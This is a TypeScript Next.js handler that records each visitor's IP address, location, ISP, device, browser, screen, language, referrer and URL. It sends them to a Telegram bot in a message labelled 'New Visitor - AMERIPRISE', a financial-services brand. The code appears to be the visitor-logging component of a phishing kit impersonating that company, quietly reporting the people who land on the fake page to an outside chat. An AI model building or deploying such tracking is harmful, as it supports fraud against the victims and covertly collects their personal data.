import { sendToTelegram } from "@/lib/telegram";
import { NextResponse } from "next/server";
import { extractRequestMeta } from "@/lib/request-meta";

export type VisitRequest = {
  event: "visit";
  screen?: string;
  language?: string;
  url?: string;
  timezone?: string;
};

/** Returns a Response — this is the full handler for a visit event. */
export async function handleVisit(req: Request): Promise<Response> {
  try {
    const body = (await req.json().catch(() => null)) as VisitRequest | null;

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return NextResponse.json(
        { error: "Missing TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID" },
        { status: 500 }
      );
    }

    const meta = await extractRequestMeta(req, body?.timezone);

    const text = [
      "🌐 New Visitor - AMERIPRISE",
      "━━━━━━━━━━━━━━━━━━",
      "",
      meta.location ? `📍 Location: ${meta.location}` : undefined,
      meta.ip ? `🌍 IP: ${meta.ip}` : undefined,
      `⏰ Timezone: ${meta.timezone}`,
      `🌐 ISP: ${meta.isp}`,
      "",
      `📱 Device: ${meta.deviceType} | ${meta.browser} | ${meta.os}`,
      body?.screen ? `🖥️ Screen: ${body.screen}` : undefined,
      body?.language ? `🌍 Language: ${body.language}` : undefined,
      "",
      meta.referer ? `🔗 Referrer: ${meta.referer}` : undefined,
      body?.url ? `🌐 URL: ${body.url}` : undefined,
      "",
      `⏰ Local Time: ${new Date().toLocaleString()}`,
      `🕒 UTC Time: ${new Date().toUTCString()}`,
    ]
      .filter(Boolean)
      .join("\n");

    await sendToTelegram(text);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}